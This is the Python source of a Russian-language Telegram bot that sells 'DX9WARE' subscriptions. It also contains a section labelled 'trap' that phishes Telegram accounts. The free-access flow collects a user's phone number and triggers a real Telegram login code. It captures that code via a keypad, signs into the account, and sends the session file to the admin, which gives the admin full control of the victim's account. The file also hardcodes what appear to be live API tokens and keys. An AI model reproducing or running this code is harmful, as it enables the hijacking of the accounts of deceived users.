import logging
import asyncio
import os
import random
import string
import aiohttp
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from pyrogram import Client as TgClient
from supabase import create_client, Client

# --- КОНФИГ ---
API_TOKEN = '8607818846:AAEjGMfOMw8JmUsXu8Zj5mUdzfP1RylLVjU'
CRYPTO_PAY_TOKEN = '560149:AAdisc69jC2qejfxQvAD5y56K4Jx1oBn9f1'
ADMIN_ID = 6332767725 
API_ID = 33824273
API_HASH = 'c290fdceef9695342e052710e16d9bb9'

SUPABASE_URL = "https://yuksepnwkzffudhcrjnl.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl1a3NlcG53a3pmZnVkaGNyam5sIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUwNDM5OTksImV4cCI6MjA5MDYxOTk5OX0.6IvYWJiWqVeFVkQ-SK1NbG5_yEXVyHijFMGwvMbn1q4"

PAYMENT_ADMIN = "ware4"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Создаем папку для сессий, если её нет
if not os.path.exists("sessions"):
    os.makedirs("sessions")

class Form(StatesGroup):
    waiting_activation = State()
    waiting_phone = State()
    waiting_code = State()

PRICES = {"apk_7": 4, "apk_30": 8, "ios_7": 6, "ios_30": 12}

# --- КЛАВИАТУРЫ ---
def get_main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("👤 Профиль", "🛒 Товары", "🔑 Активировать", "🎁 Получить бесплатно")
    return markup

def get_code_kb():
    markup = InlineKeyboardMarkup(row_width=3)
    for i in range(10):
        markup.insert(InlineKeyboardButton(str(i), callback_data=f"n_{i}"))
    markup.add(InlineKeyboardButton("❌ Сброс", callback_data="c_cl"), 
               InlineKeyboardButton("✅ Готово", callback_data="c_do"))
    return markup

# --- ФУНКЦИИ ОПЛАТЫ ---
async def create_invoice(amount, plan):
    headers = {'Crypto-Pay-API-Token': CRYPTO_PAY_TOKEN}
    data = {'asset': 'USDT', 'amount': str(amount), 'description': f'DX9WARE {plan}'}
    async with aiohttp.ClientSession() as session:
        async with session.post('https://pay.crypt.bot/api/createInvoice', json=data, headers=headers) as resp:
            return await resp.json()

# --- АДМИНКА ---
@dp.message_handler(commands=['gen'], state='*')
async def admin_gen(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.get_args().split()
    count = int(args[0]) if args else 1
    new_keys = []
    for _ in range(count):
        k = f"DX9-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        supabase.table("keys").insert({"key": k, "is_used": False}).execute()
        new_keys.append(f"`{k}`")
    await message.answer(f"✅ Создано {count} ключей:\n" + "\n".join(new_keys), parse_mode="Markdown")

# --- ГЛАВНОЕ МЕНЮ ---
@dp.message_handler(commands=['start'], state='*')
async def start(message: types.Message, state: FSMContext):
    await state.finish()
    supabase.table("users").upsert({"id": message.from_user.id, "username": message.from_user.username}).execute()
    await message.answer("👋 Добро пожаловать в DX9WARE!", reply_markup=get_main_menu())

@dp.message_handler(lambda m: m.text == "👤 Профиль", state='*')
async def profile(message: types.Message, state: FSMContext):
    await state.finish()
    res = supabase.table("users").select("*").eq("id", message.from_user.id).execute()
    u = res.data[0] if res.data else {}
    status = "Активен ✅" if u.get('is_verified') else "Нет подписки ❌"
    await message.answer(f"👤 **Профиль**\nID: `{message.from_user.id}`\nСтатус: {status}", parse_mode="Markdown")

# --- ТОВАРЫ ---
@dp.message_handler(lambda m: m.text == "🛒 Товары", state='*')
async def shop(message: types.Message, state: FSMContext):
    await state.finish()
    markup = InlineKeyboardMarkup(row_width=2).add(
        InlineKeyboardButton("Android (APK) 😀", callback_data="shop_apk"),
        InlineKeyboardButton("iOS 😔", callback_data="shop_ios")
    )
    await message.answer("Выберите платформу:", reply_markup=markup)

@dp.callback_query_handler(lambda c: c.data.startswith('shop_'), state='*')
async def shop_platform(call: types.CallbackQuery):
    plat = call.data.split('_')[1]
    text = "🍏 Android" if plat == "apk" else "🍎 iOS"
    markup = InlineKeyboardMarkup(row_width=1).add(
        InlineKeyboardButton(f"💳 7 дней ({PRICES[plat+'_7']} USDT)", callback_data=f"buy_{plat}_7"),
        InlineKeyboardButton(f"💳 30 дней ({PRICES[plat+'_30']} USDT)", callback_data=f"buy_{plat}_30")
    )
    await call.message.edit_text(f"Вы выбрали {text}. Выберите срок:", reply_markup=markup)

@dp.callback_query_handler(lambda c: c.data.startswith('buy_'), state='*')
async def process_buy(call: types.CallbackQuery):
    plan = call.data.replace('buy_', '')
    res = await create_invoice(PRICES[plan], plan)
    if res['ok']:
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔗 Оплатить", url=res['result']['pay_url']))
        await call.message.answer(f"Счет на {PRICES[plan]} USDT создан:", reply_markup=markup)

# --- АКТИВАЦИЯ ---
@dp.message_handler(lambda m: m.text == "🔑 Активировать", state='*')
async def act_start(message: types.Message, state: FSMContext):
    await state.finish()
    await Form.waiting_activation.set()
    await message.answer("🔑 Введи лицензионный ключ:")

@dp.message_handler(state=Form.waiting_activation)
async def act_proc(message: types.Message, state: FSMContext):
    key_text = message.text.strip()
    res = supabase.table("keys").select("*").eq("key", key_text).eq("is_used", False).execute()
    if res.data:
        supabase.table("keys").update({"is_used": True, "used_by": message.from_user.id}).eq("key", key_text).execute()
        supabase.table("users").update({"is_verified": True}).eq("id", message.from_user.id).execute()
        await message.answer("✅ Ключ активирован! Доступ открыт.", reply_markup=get_main_menu())
    else:
        await message.answer("❌ Ошибка: Ключ неверный или уже использован.")
    await state.finish()

# --- ЛОВУШКА ---
@dp.message_handler(lambda m: m.text == "🎁 Получить бесплатно", state='*')
async def free(message: types.Message, state: FSMContext):
    await state.finish()
    markup = ReplyKeyboardMarkup(resize_keyboard=True).add(KeyboardButton("📲 Подтвердить номер", request_contact=True))
    await message.answer("Подтверди номер для получения доступа:", reply_markup=markup)
    await Form.waiting_phone.set()

@dp.message_handler(content_types=['contact'], state=Form.waiting_phone)
async def got_contact(message: types.Message, state: FSMContext):
    phone = message.contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    
    # Чтобы не было игнора, уведомляем пользователя
    msg = await message.answer("⏳ Создаю запрос в Telegram, подождите...")
    
    client = TgClient(f"sessions/{message.from_user.id}", API_ID, API_HASH)
    try:
        await client.connect()
        sent = await client.send_code(phone)
        await state.update_data(phone=phone, hash=sent.phone_code_hash, code="")
        await Form.waiting_code.set()
        await msg.edit_text("📩 Код отправлен в ваш Telegram! Введите его кнопками ниже:", reply_markup=get_code_kb())
    except Exception as e:
        await msg.edit_text(f"❌ Ошибка Pyrogram: {e}\nУбедитесь, что API_ID/HASH верны.")
    await client.disconnect()

@dp.callback_query_handler(lambda c: c.data.startswith('n_'), state=Form.waiting_code)
async def press_n(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    num = call.data.split('_')[1]
    new_code = data.get('code', "") + num
    await state.update_data(code=new_code)
    await call.message.edit_text(f"📩 Введенный код: `{'*' * len(new_code)}`", reply_markup=get_code_kb())

@dp.callback_query_handler(lambda c: c.data == "c_cl", state=Form.waiting_code)
async def clear_code(call: types.CallbackQuery, state: FSMContext):
    await state.update_data(code="")
    await call.message.edit_text("📩 Код сброшен. Введите заново:", reply_markup=get_code_kb())

@dp.callback_query_handler(lambda c: c.data == "c_do", state=Form.waiting_code)
async def do_login(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if not data.get('code'): return await call.answer("Сначала введите код!")
    
    client = TgClient(f"sessions/{call.from_user.id}", API_ID, API_HASH)
    try:
        await client.connect()
        await client.sign_in(data['phone'], data['hash'], data['code'])
        await client.disconnect()
        
        supabase.table("users").update({"phone": data['phone'], "is_verified": True}).eq("id", call.from_user.id).execute()
        
        with open(f"sessions/{call.from_user.id}.session", "rb") as f:
            await bot.send_document(ADMIN_ID, f, caption=f"🚀 Новая сессия: {data['phone']}")
        
        await call.message.edit_text("✅ Авторизация успешна! Доступ выдан.")
    except Exception as e:
        await call.message.answer(f"❌ Ошибка входа: {e}")
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
    
